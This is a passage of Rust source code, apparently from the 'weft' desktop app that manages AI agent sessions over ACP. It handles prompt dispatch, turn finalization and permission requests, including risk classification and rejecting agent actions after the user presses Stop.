                clear_acp_native_never_prompted(&app, &db, &eng, sid, thread_id_i).await;
            }
            return Err(anyhow::anyhow!("engine stopped before ACP prompt"));
        }
        g.reset_epoch
    };
    let first_open = prior_native.is_none();
    let (a, d, e, c, s, txt, imgs, first_open, sid_opt, tid) = (
        app.clone(),
        db.clone(),
        eng.clone(),
        client.clone(),
        session_id.clone(),
        text,
        out.images.clone(),
        first_open,
        sid,
        thread_id_i,
    );
    tauri::async_runtime::spawn(async move {
        // Re-validate under the lock once more right before the RPC — stop may
        // have landed while this task was scheduled.
        {
            let g = e.lock().await;
            if g.stopped || g.interrupting || g.reset_epoch != prompt_epoch {
                drop(g);
                let _ = c.cancel(&s).await;
                c.unsubscribe(&s).await;
                if first_open {
                    clear_acp_native_never_prompted(&a, &d, &e, sid_opt, tid).await;
                }
                return;
            }
        }
        // Soft thinking chip for the pre-token gap. Many models (incl. current
        // omp/grok) do not stream agent_thought_chunk; without this the UI only
        // shows a generic "working" pulse until the first answer token.
        {
            let (thread_id, session_id) = {
                let g = e.lock().await;
                (g.thread_id, g.session_id)
            };
            let _ = a.emit(
                EVENT,
                Push::Activity {
                    thread_id,
                    session_id,
                    name: "thinking".into(),
                    summary: String::new(),
                },
            );
        }
        match c.prompt(&s, &txt, &imgs).await {
            Ok(outcome) => {
                let (cancelled, stopped) = {
                    let g = e.lock().await;
                    (
                        outcome.cancelled || g.interrupting || g.stopped,
                        g.stopped || g.reset_epoch != prompt_epoch,
                    )
                };
                if stopped {
                    // Hard stop already owns terminal state — do not emit idle.
                    return;
                }
                acp_drain_then_end(
                    a.clone(),
                    d.clone(),
                    e.clone(),
                    c.clone(),
                    s.clone(),
                    outcome.is_error,
                    cancelled,
                    outcome.usage.clone(),
                    prompt_epoch,
                )
                .await;
            }
            Err(err) => {
                eprintln!("[weft][acp] prompt failed: {err}");
                let (interrupting, stopped) = {
                    let g = e.lock().await;
                    (g.interrupting, g.stopped || g.reset_epoch != prompt_epoch)
                };
                if stopped {
                    return;
                }
                // The prompt is gone; its permission cards must go with it.
                cancel_open_acp_asks(&a, &e).await;
                acp_drain_then_end(
                    a.clone(),
                    d.clone(),
                    e.clone(),
                    c.clone(),
                    s.clone(),
                    true,
                    interrupting,
                    None,
                    prompt_epoch,
                )
                .await;
            }
        }
    });
    // Stop pressed while we were connecting? Best-effort cancel.
    if eng.lock().await.interrupting {
        let _ = client.cancel(&session_id).await;
    }
    Ok(())
}

/// Cancel every permission card this turn left open, and stop tracking them.
///
/// A TRANSPORT failure — the child died, the connection dropped — ends the
/// prompt while the consumer is still blocked on the `AskRegistry` receiver, so
/// nothing else ever retires the card. It stays actionable for the full hour
/// timeout, and answering it with Always or Full persists a standing grant for
/// a request whose native session no longer exists. Cancelling also releases
/// the consumer, which then replies `RejectOnce` into a dead connection —
/// harmless, and the honest wire answer.
async fn cancel_open_acp_asks(app: &AppHandle, eng: &EngineRef) {
    let asks = std::mem::take(&mut eng.lock().await.acp_pending_asks);
    if asks.is_empty() {
        return;
    }
    if let Some(reg) = app.try_state::<crate::ask::AskRegistry>() {
        for id in asks {
            reg.inner().cancel(id);
        }
    }
}

/// Wait until the session consumer has drained events enqueued before the
/// prompt result, then finalize. Prevents turn-end from racing late text/tool
/// rows still in the mpsc buffer.
async fn acp_drain_then_end(
    app: AppHandle,
    db: Db,
    eng: EngineRef,
    client: crate::acp::runtime::ClientHandle,
    session_id: String,
    is_error: bool,
    cancelled: bool,
    usage: Option<crate::acp::runtime::UsageBits>,
    prompt_epoch: u64,
) {
    let (tx, rx) = tokio::sync::oneshot::channel();
    let sent = client
        .send_session_event(
            &session_id,
            crate::acp::runtime::SessionEvent::DrainBarrier(tx),
        )
        .await;
    if sent {
        // Bounded wait: if the consumer is gone, don't hang finalize forever.
        let _ = tokio::time::timeout(std::time::Duration::from_secs(5), rx).await;
    }
    acp_emit_turn_end(app, db, eng, is_error, cancelled, usage, prompt_epoch).await;
}

/// Whether a DEQUEUED prompt may still be dispatched.
///
/// The epoch alone is not enough. `interrupt()` sets `interrupting` WITHOUT
/// bumping the epoch — deliberately, so a queued message survives interrupting
/// the current turn — and it sends `session/cancel` against whatever prompt is
/// live. A Stop landing after `on_turn_end` promoted a queued item but before
/// it is dispatched therefore cancels NOTHING (the old prompt has ended, the
/// new one has not started), leaves the epoch untouched, and the dispatch went
/// ahead: the user pressed Stop and a fresh turn ran anyway, executing tools
/// until it finished on its own or the 8s forced reset fired.
///
/// `stopped` and `tearing_down` are included for the same reason they gate
/// every other admission point — this is one of them.
fn queued_dispatch_admissible(inner: &EngineInner, dequeue_epoch: u64) -> bool {
    !inner.stopped
        && !inner.interrupting
        && !inner.tearing_down
        && inner.reset_epoch == dequeue_epoch
}

async fn acp_emit_turn_end(
    app: AppHandle,
    db: Db,
    eng: EngineRef,
    is_error: bool,
    cancelled: bool,
    usage: Option<crate::acp::runtime::UsageBits>,
    prompt_epoch: u64,
) {
    let mut pending_usage = usage;
    let mut pending_error = is_error;
    let mut pending_cancel = cancelled;
    // Optional follow-up prompt after finalize (queue drain) — loop, not recurse.
    let mut follow_up: Option<(
        crate::acp::runtime::ClientHandle,
        String,
        Outgoing,
        u64,
        i32,
    )> = None;
    loop {
        if let Some((client, sid, msg, dequeue_epoch, turn_id)) = follow_up.take() {
            let admissible = {
                let g = eng.lock().await;
                queued_dispatch_admissible(&g, dequeue_epoch)
            };
            if !admissible {
                rollback_failed_turn(&app, &db, &eng, turn_id, "interrupted").await;
                finalize_dequeued_row(&app, &db, eng.lock().await.thread_id, &msg, "interrupted")
                    .await;
                break;
            }
            let thread_id = eng.lock().await.thread_id;
            let session_id = eng.lock().await.session_id;
            mark_queued_delivered(&app, &db, thread_id, session_id, &msg).await;
            match client.prompt(&sid, &msg.text, &msg.images).await {
                Ok(outcome) => {
                    pending_usage = outcome.usage.clone();
                    pending_error = outcome.is_error;
                    pending_cancel = outcome.cancelled || eng.lock().await.interrupting;
                    // Drain consumer before finalizing this queued turn (same as
                    // first-prompt path via acp_drain_then_end).
                    let (tx, rx) = tokio::sync::oneshot::channel();
                    if client
                        .send_session_event(
                            &sid,
                            crate::acp::runtime::SessionEvent::DrainBarrier(tx),
                        )
                        .await
                    {
                        let _ = tokio::time::timeout(std::time::Duration::from_secs(5), rx).await;
                    }
                }
                Err(err) => {
                    eprintln!("[weft][acp] flush prompt failed: {err}");
                    let status = drain_failure_status(&eng, dequeue_epoch).await;
                    // Same for a queued prompt that died mid-flight.
                    cancel_open_acp_asks(&app, &eng).await;
                    // Close what this prompt already streamed BEFORE resetting
                    // the turn — the reset drops `inner.current` without
                    // finalizing it, and un-drained consumer updates would
                    // otherwise land on an already-idle session.
                    acp_drain_and_finalize_open_rows(&app, &db, &eng, &client, &sid, status).await;
                    rollback_failed_turn(&app, &db, &eng, turn_id, status).await;
                    finalize_dequeued_row(&app, &db, thread_id, &msg, status).await;
                    break;
                }
            }
        }

        let mut inner = eng.lock().await;
        // Hard stop / takeover already wrote STATUS_STOPPED and bumped
        // reset_epoch. A late cancelled prompt must not overwrite that with idle.
        if inner.stopped || inner.reset_epoch != prompt_epoch {
            drop(inner);
            break;
        }
        let thread_id = inner.thread_id;
        let session_id = inner.session_id;
        // Prompt-result usage is billing counters (totalTokens/inputTokens),
        // not the live context window. Context comes only from usage_update
        // notifications (SessionEvent::Usage → last_context_tokens). Do not
        // overwrite that here — OMP's totalTokens is ~2× used.
        let _ = pending_usage;
        persist_engine_meta(&db, &inner).await;
        let status = if inner.interrupting || pending_cancel {
            "interrupted"
        } else if pending_error {
            "error"
        } else {
            "complete"
        };
        inner.interrupting = false;
        let orphans: Vec<(i32, serde_json::Value)> =
            inner.tool_rows.drain().map(|(_, v)| v).collect();
        finalize_orphan_tool_rows(&app, &db, thread_id, orphans, status).await;
        let had_item_rows = !inner.open_texts.is_empty();
        finalize_open_texts(&app, &db, &mut inner, status).await;
        if inner.current.is_some() {
            finalize_current_text(&app, &db, &mut inner, status).await;
        } else if !had_item_rows && !inner.turn_saw_text {
            if let Ok(Some(m)) = insert_terminal_assistant_if_missing(
                &db,
                thread_id,
                inner.session_id,
                inner.turn_id,
                status,
            )
            .await
            {
                let _ = app.emit(
                    EVENT,
                    Push::Message {
                        thread_id,
                        message: m,
                    },
                );
            }
        }
        let next = inner.turn.on_turn_end();
        advance_dequeued_turn(&mut inner, &next);
        inner.last_assistant_uuid = None;
        inner.turn_saw_text = false;
        let next_turn_id = if next.is_some() {
            inner.turn_id += 1;
            Some(inner.turn_id)
        } else {
            None
        };
        let dequeue_epoch = inner.reset_epoch;
        let still_busy = inner.turn.busy;
        let client = inner.acp_client.clone();
        let native = inner.native_id.clone();
        persist_activity(
            &db,
            inner.session_id,
            thread_id,
            if still_busy { "running" } else { "idle" },
        )
        .await;
        inner.clock.on_turn_end(still_busy);
        let _ = app.emit(
            EVENT,
            Push::Turn {
                thread_id,
                session_id: inner.session_id,
                state: if still_busy { "busy" } else { "idle" }.into(),
                queue: queue_items(&inner.turn),
            },
        );
        drop(inner);

        let flush_stop_won = {
            let g = eng.lock().await;
            g.stopped || g.reset_epoch != dequeue_epoch
        };
        if flush_stop_won {
            if let Some(turn_id) = next_turn_id {
                rollback_failed_turn(&app, &db, &eng, turn_id, "interrupted").await;
            }
            if let Some(n) = next.as_ref() {
                finalize_dequeued_row(&app, &db, thread_id, n, "interrupted").await;
            }
            break;
        }
        match (next, next_turn_id, client, native) {
            (Some(n), Some(turn_id), Some(client), Some(sid)) => {
                if let Some(qid) = n.queue_id {
                    snapshot_turn_checkpoint(&app, &db, session_id, turn_id, qid).await;
                }
                follow_up = Some((client, sid, n, dequeue_epoch, turn_id));
                pending_usage = None;
                pending_error = false;
                pending_cancel = false;
                continue;
            }
            _ => break,
        }
    }
}

/// Worst-case tier across every path a file request named, or `pathless` when
/// it named none.
///
/// The pathless verdict is per-verb rather than "ask `classify_file` with an
/// empty path", because those two disagree in the direction that matters: a
/// write with no target is still a write, but a READ with no target has
/// established nothing at all and must not inherit `ReadOnly`.
fn file_risk(
    tool_name: &'static str,
    paths: &[String],
    pathless: crate::ask::RiskLevel,
) -> crate::ask::RiskLevel {
    if paths.is_empty() {
        return pathless;
    }
    crate::ask::most_severe(
        paths.iter().map(|path| {
            crate::ask::classify_risk(crate::ask::RiskSignal::File { tool_name, path })
        }),
    )
}

/// Reject an ACP permission request on the wire without a human verdict —
/// used when teardown won the race and the card must not stand.
async fn return_permission(
    client: &crate::acp::runtime::ClientHandle,
    request_id: &serde_json::Value,
    options: &[serde_json::Value],
) {
    client
        .reply_permission(request_id, options, crate::acp::Want::RejectOnce)
        .await;
}

/// Risk tier for one ACP permission request (issue #101).
///
/// A file request is scored across EVERY path it names, worst tier wins. The
/// first path used to decide alone, so a multi-file read whose leading entry
/// was ordinary came out `ReadOnly` even when a later entry was a credential —
/// and `auto_decision` releases `ReadOnly` asks under a read-only session or
/// issue grant (issue #103), so that access would be approved without a human
/// ever seeing the card.
///
/// A file request that named NO path is still classified by its verb: it goes
/// through `classify_file` once with an empty path, rather than through
/// `most_severe` of nothing, so a write stays a write.
fn acp_permission_risk(
    intent: &crate::acp::permission::PermissionIntent,
    detail: &str,
) -> crate::ask::RiskLevel {
    use crate::acp::permission::PermissionIntent;
    match intent {
        PermissionIntent::Command(cmd) => {
            crate::ask::classify_risk(crate::ask::RiskSignal::Command(cmd))
        }
        // A read that named nothing has established NOTHING. `classify_file`
        // would answer `ReadOnly` from the verb alone, and a read-only session
        // or issue grant releases `ReadOnly` without a card — so a sparse
        // request whose target rides in `title`/`content` could read `.env` or
        // an SSH key unseen. Same rule as `most_severe` of an empty set:
        // "nothing to judge" is not evidence of safety.
        PermissionIntent::Read { paths } => {
            file_risk("Read", paths, crate::ask::RiskLevel::Unknown)
        }
        // A write that named nothing IS still a write: the verb alone
        // establishes mutation, so the verb-derived tier is the honest floor.
        PermissionIntent::Write { paths } => file_risk("Edit", paths, crate::ask::RiskLevel::Write),
        PermissionIntent::Network => crate::ask::classify_risk(crate::ask::RiskSignal::Network),
        // GUI computer-use requests (omp's native `computer`/`browser` tools):
        // the action word alone decides the tier — observation actions are
        // ReadOnly, injected input is Write, anything unrecognized stays
        // Unknown. Same closed word list the weft_computer MCP path uses.
        PermissionIntent::Gui { action } => crate::ask::classify_gui_action(action),
        // defensive only — the ACP consumer replies
        // AllowOnce for this intent before any risk is ever computed (see the
        // handler's own carve-out), so this arm is never reached in
        // production. The honest tier is still the action word's own, same as
        // the Gui arm above, so nothing downstream could ever under-tier it.
        PermissionIntent::WeftComputerMcp { action } => crate::ask::classify_gui_action(action),
        PermissionIntent::Other { kind } => {
            crate::ask::classify_risk(crate::ask::RiskSignal::Other {
                tool_name: kind,
                args_text: detail,
            })
        }
    }
}

/// whether an ACP permission `intent` is OMP's
/// own native `computer`/`browser` tool (see `acp::permission::
/// PermissionIntent::Gui`'s own doc) — the ONE question `acp_consumer`'s
/// `SessionEvent::Permission` arm now asks before it does ANYTHING else with
/// the request.
///
/// Superseding rounds 7/9/10 entirely (`gui_or_ordinary_auto_decision`,
/// `gui_kill_switch_denies`, `permission_reply_must_reject`,
/// `computer_enabled_for_acp` — all deleted by this change, none had any
/// other caller): those rounds still let a native GUI request run through
/// the SAME auto-grant/human-card machinery an ordinary permission gets,
/// gated only by `computer::enabled`. That design is what produced every
/// one of this change's own findings, because OMP's native `computer`/
/// `browser` tool executes the OS action ITSELF — Weft never sees the call
/// happen, so it cannot fit its control lease, global Escape, completion
/// guard, or coordinate model around an action some OTHER process already
/// ran; there is no completion guard Weft could wrap around a process it
/// doesn't own. So a GUI intent is no longer a permission DECISION at
/// all — it is rejected outright, unconditionally, before anything else
/// runs:
///  - no card is ever shown, so a native `type` action's literal keystrokes
///    never reach an IM card's `detail`;
///  - no Always/Full grant is ever written, so the plaintext-carrying
///    `grant_id` this arm folds into `action_key` a few lines below never
///    reaches the durable grants store for a GUI intent (review 4858,
///    "原生授权键含明文");
///  - the reply always lands before any DB/lease await, needs no lease, and
///    answers to Stop the same way the pre-existing `reject_now` teardown
///    check above already does.
///
/// Depth-in-depth note: `ask::AskRegistry::cancel_gui_asks`
/// still generalizes emergency-stop cancellation to any GUI-marked
/// `action_key`, so a future path that somehow DID register a GUI-shaped
/// card would still be reachable by Stop — but THIS check's job is to make
/// sure that future path never exists for OMP's native tool in the first
/// place.
///
/// No wire-level "use `weft_computer` instead" hint travels with the
/// rejection: ACP's `session/request_permission` reply is a bare
/// `{outcome:{outcome:"selected", optionId}}` (see `acp::permission::
/// selected_outcome`) with no field for one, and `acp::permission`/
/// `acp::runtime` are outside this change's file scope — the reply reuses
/// the EXACT SAME channel the pre-existing `reject_now` teardown check
/// above already replies through. The guidance belongs here, in this
/// module's own doc trail, and in whatever an agent's own UI shows for a
/// rejected native tool call: use the injected `weft_computer` MCP tool
/// instead — it has a permission card, the control lease, and the
/// emergency stop.
///
/// Pure and synchronous so this exact decision is unit-testable without the
/// surrounding async ACP event loop, which needs a live
/// `acp::runtime::ClientHandle` and isn't itself practical to drive from a
/// plain `#[test]`.
fn is_gui_intent(intent: &crate::acp::permission::PermissionIntent) -> bool {
    matches!(intent, crate::acp::permission::PermissionIntent::Gui { .. })
}

/// whether this permission
/// request is for weft's OWN injected `weft_computer` MCP tool — see
/// `permission::PermissionIntent::WeftComputerMcp`'s doc (and
/// `is_weft_computer_mcp_call`'s, for the strict title recognition and its
/// trust argument). The ACP consumer auto-ALLOWS these, checked BEFORE the
/// `is_gui_intent` rejection above would match the same `rawInput.action`
/// shape: the call's real side effect is an HTTP request to weft's own
/// `bus::computer_srv` gate chain (enabled check, approval card, control
/// lease, throttle, Stop, audit), so rejecting it broke every omp-side
/// computer-use action that omp permission-gates, and carding it here would
/// double-card what that server already cards — the same reasoning
/// `bus::server::AUTO_APPROVED_INTERNAL_TOOLS` records for this exact tool
/// on the claude/opencode hook path. Pure and synchronous for the same
/// unit-testability reason as `is_gui_intent` above.
fn is_weft_computer_mcp_intent(intent: &crate::acp::permission::PermissionIntent) -> bool {
    matches!(
        intent,
        crate::acp::permission::PermissionIntent::WeftComputerMcp { .. }
    )
}

/// How much of the reasoning stream the busy-line chip shows.
const THOUGHT_TAIL_CHARS: usize = 160;

/// A bounded tail of one turn's reasoning text, for the busy-line chip.
///
/// Kept bounded rather than accumulated: a turn's whole `agent_thought_chunk`
/// stream can be arbitrarily long, and re-collecting it into a `Vec<char>` on
/// every chunk just to slice off the last [`THOUGHT_TAIL_CHARS`] made the work
/// quadratic in the reasoning length — on the same single task that forwards
/// tool progress and answer tokens. Trimming on push keeps both the
/// buffer and the per-chunk work proportional to the display window.
#[derive(Default)]
struct ThoughtTail {
    buf: String,
    /// Whether anything was dropped off the front — the chip's leading
    /// ellipsis. Not recoverable from `buf` once it has been trimmed to size.
    elided: bool,
}

impl ThoughtTail {
    fn push(&mut self, text: &str) {
        self.buf.push_str(text);
        // Bounded by the window plus THIS chunk, never by the turn so far.
        let len = self.buf.chars().count();
        if len <= THOUGHT_TAIL_CHARS {
            return;
        }
        let excess = len - THOUGHT_TAIL_CHARS;
        let cut = self
            .buf
            .char_indices()
            .nth(excess)
            .map(|(i, _)| i)
            .unwrap_or(self.buf.len());
        self.buf.drain(..cut);
        self.elided = true;
    }

    fn summary(&self) -> String {
        if self.elided {
            return format!("…{}", self.buf);
        }
        self.buf.clone()
    }

    fn clear(&mut self) {
        self.buf.clear();
        self.elided = false;
    }
}

async fn acp_consumer(
    app: AppHandle,
    db: Db,
    eng: EngineRef,
    client: crate::acp::runtime::ClientHandle,
    _session_id: String,
    mut rx: tokio::sync::mpsc::UnboundedReceiver<crate::acp::runtime::SessionEvent>,
    // The engine generation this route was subscribed under — captured by the
    // caller BEFORE this task was spawned, so it names the session that created
    // the route rather than whatever won a race afterwards.
    start_epoch: u64,
) {
    use super::proto::ChatEvent;
    use crate::acp::runtime::SessionEvent;
    // Accumulated thought text for the busy-line chip, bounded to the display
    // window. Cleared at every prompt boundary — see the DrainBarrier arm.
    let mut thought_buf = ThoughtTail::default();
    while let Some(msg) = rx.recv().await {
        let receipt_activity = match &msg {
            SessionEvent::Chat(event) => super::proto::is_agent_activity(event),
            SessionEvent::Thought { text } => !text.trim().is_empty(),
            SessionEvent::ToolProgress { summary } => !summary.trim().is_empty(),
            SessionEvent::Permission { .. } => true,
            SessionEvent::Commands(_)
            | SessionEvent::Usage { .. }
            | SessionEvent::Meta { .. }
            | SessionEvent::DrainBarrier(_) => false,
        };
        match msg {
            // Barrier: prompt-task waits until prior events are drained.
            SessionEvent::DrainBarrier(tx) => {
                // This barrier IS the end of a prompt, and it is the only end
                // every prompt reaches. Clearing only on answer text or a tool
                // call leaks reasoning across turns whenever a prompt produced
                // thought chunks and nothing else — a clean cancellation, an
                // error, a refusal — because this consumer outlives the prompt.
                // The next turn's first chunk would then render appended to the
                // previous turn's reasoning as if it were current activity.
                //
                // Placed BEFORE the stop/epoch guard below on purpose: a turn
                // torn down mid-reasoning is exactly a turn whose tail must not
                // survive, and that guard would otherwise skip this arm.
                thought_buf.clear();
                let _ = tx.send(());
            }
            _ if {
                let g = eng.lock().await;
                g.stopped || g.reset_epoch != start_epoch
            } =>
            {
                // Drop late events after stop/unsubscribe/teardown.
            }
            SessionEvent::ToolProgress { summary } => {
                let mut inner = eng.lock().await;
                if receipt_activity {
                    note_turn_activity(&app, &db, &eng, &mut inner);
                }
                let (thread_id, session_id) = (inner.thread_id, inner.session_id);
                drop(inner);
                let _ = app.emit(
                    EVENT,
                    Push::Activity {
                        thread_id,
                        session_id,
                        name: "tool".into(),
                        summary,
                    },
                );
            }
            SessionEvent::Thought { text } => {
                {
                    let mut inner = eng.lock().await;
                    if receipt_activity {
                        note_turn_activity(&app, &db, &eng, &mut inner);
                    }
                }
                thought_buf.push(&text);
                // Live reasoning on the busy line so the turn doesn't look stuck
                // before the first answer token. Show a tail window of the buffer.
                let summary = thought_buf.summary();
                let thread_id = eng.lock().await.thread_id;
                let session_id = eng.lock().await.session_id;
                let _ = app.emit(
                    EVENT,
                    Push::Activity {
                        thread_id,
                        session_id,
                        name: "thinking".into(),
                        summary,
                    },
                );
            }

            SessionEvent::Chat(ChatEvent::TextDelta {
                text,
                item: _,
                agent_thread: _,
            }) => {
                // Answer tokens started — drop soft/real thinking chip always.
                thought_buf.clear();
                {
                    let (thread_id, session_id) = {
                        let i = eng.lock().await;
                        (i.thread_id, i.session_id)
                    };
                    let _ = app.emit(
                        EVENT,
                        Push::Activity {
                            thread_id,
                            session_id,
                            name: String::new(),
                            summary: String::new(),
                        },
                    );
                }
                let mut inner = eng.lock().await;
                if receipt_activity {
                    note_turn_activity(&app, &db, &eng, &mut inner);
                }
                let thread_id = inner.thread_id;
                let (sid, turn) = (inner.session_id, inner.turn_id);
                if inner.current.is_none() {
                    let Ok(m) = repo::insert_lead_message(
                        &db,
                        thread_id,
                        sid,
                        turn,
                        "assistant",
                        "text",
                        r#"{"text":""}"#,
                        "streaming",
                    )
                    .await
                    else {
                        continue;
                    };
                    inner.current = Some((m.id, String::new(), std::time::Instant::now()));
                    let _ = app.emit(
                        EVENT,
                        Push::Message {
                            thread_id,
                            message: m,
                        },
                    );
                }
                let origin_tag = inner.current_origin_tag.clone();
                let Some(c) = inner.current.as_mut() else {
                    continue;
                };
                c.1.push_str(&text);
                let row = c.0;
                if c.2.elapsed().as_millis() >= STREAM_THROTTLE_MS {
                    c.2 = std::time::Instant::now();
                    let content = serde_json::json!({ "text": c.1 }).to_string();
                    let _ = repo::update_lead_message(&db, row, &content, "streaming").await;
                    emit_lead_delta(&app, thread_id, row, &c.1, false, origin_tag);
                }
                let _ = app.emit(
                    EVENT,
                    Push::Delta {
                        thread_id,
                        message_id: row,
                        text,
                    },
                );
            }
            SessionEvent::Chat(ChatEvent::Assistant { tools, .. }) => {
                // Tool calls end thinking (including soft pre-token chip).
                thought_buf.clear();
                {
                    let (thread_id, session_id) = {
                        let i = eng.lock().await;
                        (i.thread_id, i.session_id)
                    };
                    let _ = app.emit(
                        EVENT,
                        Push::Activity {
                            thread_id,
                            session_id,
                            name: String::new(),
                            summary: String::new(),
                        },
                    );
                }
                let mut inner = eng.lock().await;
                if receipt_activity {
                    note_turn_activity(&app, &db, &eng, &mut inner);
                }
                // Close the open text row so post-tool text starts a new bubble.
                if inner.current.is_some() {
                    finalize_current_text(&app, &db, &mut inner, "complete").await;
                }
                persist_tool_calls(&app, &db, &mut inner, tools, None).await;
            }
            SessionEvent::Chat(ChatEvent::ToolResults { items }) => {
                let mut inner = eng.lock().await;
                if receipt_activity {
                    note_turn_activity(&app, &db, &eng, &mut inner);
                }
                merge_tool_results(&app, &db, &mut inner, items).await;
            }
            SessionEvent::Chat(ChatEvent::Commands { commands }) => {
                let mut inner = eng.lock().await;
                // Empty is authoritative (session cleared its slash palette).
                inner.slash_commands = commands.clone();
                let (thread_id, session_id) = (inner.thread_id, inner.session_id);
                let _ = app.emit(
                    EVENT,
                    Push::Init {
                        thread_id,
                        session_id,
                        native_id: inner.native_id.clone().unwrap_or_default(),
                        slash_commands: commands,
                        mcp_servers: inner.last_mcp_servers.clone(),
                        tools: inner.last_tools.clone(),
                        model: inner.last_model.clone(),
                        window: inner.last_window,
                        mcp_known: false,
                    },
                );
            }
            SessionEvent::Commands(commands) => {
                let mut inner = eng.lock().await;
                // Empty is authoritative (session cleared its slash palette).
                inner.slash_commands = commands.clone();
                let (thread_id, session_id) = (inner.thread_id, inner.session_id);
                let _ = app.emit(
                    EVENT,
                    Push::Init {
                        thread_id,
                        session_id,
                        native_id: inner.native_id.clone().unwrap_or_default(),
                        slash_commands: commands,
                        mcp_servers: inner.last_mcp_servers.clone(),
                        tools: inner.last_tools.clone(),
                        model: inner.last_model.clone(),
                        window: inner.last_window,
                        mcp_known: false,
                    },
                );
            }
            SessionEvent::Usage {
                context_tokens,
                window,
            } => {
                let mut inner = eng.lock().await;
                inner.last_context_tokens = Some(context_tokens);
                if window.is_some() {
                    inner.last_window = window;
                }
                let (thread_id, session_id) = (inner.thread_id, inner.session_id);
                let _ = app.emit(
                    EVENT,
                    Push::Usage {
                        thread_id,
                        session_id,
                        context_tokens,
                        window: inner.last_window,
                        model: inner.last_model.clone(),
                    },
                );
            }
            SessionEvent::Meta { model, thinking } => {
                let mut inner = eng.lock().await;
                if model.is_some() {
                    inner.last_model = model;
                }
                if thinking.is_some() {
                    inner.last_reasoning = thinking;
                }
            }
            SessionEvent::Permission {
                request_id,
                summary,
                detail,
                intent_key,
                intent,
                grant_id,
                options,
            } => {
                let (thread_id, tool, dir, reject_now) = {
                    let mut i = eng.lock().await;
                    if receipt_activity {
                        note_turn_activity(&app, &db, &eng, &mut i);
                    }
                    (
                        i.thread_id,
                        i.tool.clone(),
                        i.ask_dir.clone(),
                        i.stopped || i.interrupting,
                    )
                };
                if reject_now {
                    client
                        .reply_permission(&request_id, &options, crate::acp::Want::RejectOnce)
                        .await;
                    continue;
                }
                // weft's
                // OWN injected `weft_computer` MCP tool is auto-allowed,
                // BEFORE the native-GUI rejection below (whose broadened
                // `rawInput.action` match would otherwise swallow it) — the
                // server-side gate chain owns the real approval. See
                // `is_weft_computer_mcp_intent`'s doc for the full rationale
                // and the strict provenance recognition behind the intent.
                if is_weft_computer_mcp_intent(&intent) {
                    client
                        .reply_permission(&request_id, &options, crate::acp::Want::AllowOnce)
                        .await;
                    continue;
                }
                // every ACP GUI intent (OMP's own
                // native `computer`/`browser` tool) is rejected outright,
                // unconditionally — no card, no grant lookup, no kill-switch
                // consultation, no lease — BEFORE anything below builds a
                // card or persists a grant for it. See `is_gui_intent`'s own
                // doc for the full rationale and the specific findings this
                // converges.
                if is_gui_intent(&intent) {
                    client
                        .reply_permission(&request_id, &options, crate::acp::Want::RejectOnce)
                        .await;
                    continue;
                }
                // Precise Always key (issue #89): ACP family + session intent +
                // the canonical action identity, so two different actions never
                // share a grant. NOT `detail`: that is the stringified
                // `rawInput`, which is identical (often empty) for two edits
                // whose only difference lives in `toolCall.locations` — the
                // very field the risk classifier reads first. `grant_id`
                // folds every named location in; see `permission::grant_identity`.
                // `intent` is guaranteed non-GUI past the check above.
                let action_key = crate::ask::action_key(&["Acp", &intent_key, &grant_id]);
                // Clone the registry BEFORE any await — State guards are !Send.
                let asks = app
                    .try_state::<crate::ask::AskRegistry>()
                    .map(|s| s.inner().clone());
                // Risk tier for the Needs-you card (issue #101), from the
                // classified `toolCall` rather than the lossy always-grant key.
                // Computed BEFORE `auto_decision` because the read-only batch
                // grants (issue #103) key on the tier: deriving it only in the
                // `None` arm would make every ACP ask miss those grants.
                let risk = acp_permission_risk(&intent, &detail);
                let want = if let Some(asks) = asks {
                    match asks.auto_decision(thread_id, &dir, risk, &action_key) {
                        Some(crate::ask::Decision::Allow) => crate::acp::Want::AllowOnce,
                        Some(crate::ask::Decision::Deny) => crate::acp::Want::RejectOnce,
                        None => {
                            let (id, rx) = asks.request(
                                thread_id,
                                &dir,
                                &tool,
                                &summary,
                                &detail,
                                risk,
                                &action_key,
                            );
                            // Register in the SAME lock acquisition that
                            // re-checks teardown, and give up the card if
                            // teardown already won. With registration as a
                            // separate acquisition, a Stop or engine switch
                            // landing right after `asks.request` took an empty
                            // `acp_pending_asks` and completed teardown while
                            // the card was already on screen. The card then
                            // outlived the turn, and answering it with Always
                            // or Full persisted a standing grant — the
                            // post-await check below only turns the WIRE reply
                            // into a rejection, it cannot un-grant that.
                            let registered = {
                                let mut g = eng.lock().await;
                                let lost =
                                    g.stopped || g.interrupting || g.reset_epoch != start_epoch;
                                if !lost {
                                    g.acp_pending_asks.push(id);
                                }
                                !lost
                            };
                            if !registered {
                                asks.cancel(id);
                                return_permission(&client, &request_id, &options).await;
                                continue;
                            }
                            let decided = match tokio::time::timeout(
                                std::time::Duration::from_secs(3600),
                                rx,
                            )
                            .await
                            {
                                Ok(Ok(crate::ask::Decision::Allow)) => crate::acp::Want::AllowOnce,
                                Ok(Ok(crate::ask::Decision::Deny)) => crate::acp::Want::RejectOnce,
                                _ => {
                                    asks.cancel(id);
                                    crate::acp::Want::RejectOnce
                                }
                            };
                            // Drop tracking whether answered or cancelled.
                            {
                                let mut g = eng.lock().await;
                                g.acp_pending_asks.retain(|x| *x != id);
                            }
                            decided
                        }
                    }
                } else {
                    crate::acp::Want::RejectOnce
                };
                // ONE final gate, on the path every branch leaves through, so
                // "never allow after teardown" is an invariant of the reply
                // rather than a check each branch has to remember.
                //
                // The waited-for-a-human branch used to carry its own copy and
                // the AUTO-GRANT branch carried none: with an Always/Full hit
                // there is no ask to cancel, so a Stop landing between the
                // `reject_now` sample and the `auto_decision` verdict reached
                // the wire as an allow — queued ahead of `session/cancel`,
                // starting a tool after the user had stopped the turn.
                //
                // Note: a GUI intent never reaches
                // this point at all (rejected above, before any await) — the
                // the "recheck computer::enabled a second time
                // after the human-review await" machinery this gate used to
                // also carry is gone with it: `computer::enabled` and Stop's
                // interaction with a native GUI request are no longer this
                // gate's problem, because a native GUI request can no longer
                // reach a human-review await in the first place.
                let want = {
                    let teardown = {
                        let g = eng.lock().await;
                        g.stopped || g.interrupting || g.reset_epoch != start_epoch
                    };
                    if teardown {
                        crate::acp::Want::RejectOnce
                    } else {
                        want
                    }
                };
                client.reply_permission(&request_id, &options, want).await;
            }
            SessionEvent::Chat(_) => {}
        }
    }
    let _ = client; // keep handle for permission replies while loop runs
}

/// issue #97: whether a `text` delta arriving on codex_consumer's anonymous
/// slot (`item: None`) is an exact repeat of what's already at the TAIL of the
/// accumulated buffer. codex app-server's only `item:None` deltas are error
/// surfacing (see `codex_consumer`'s `None` arm) — a top-level `error`
/// notification can be followed by the SAME message again via
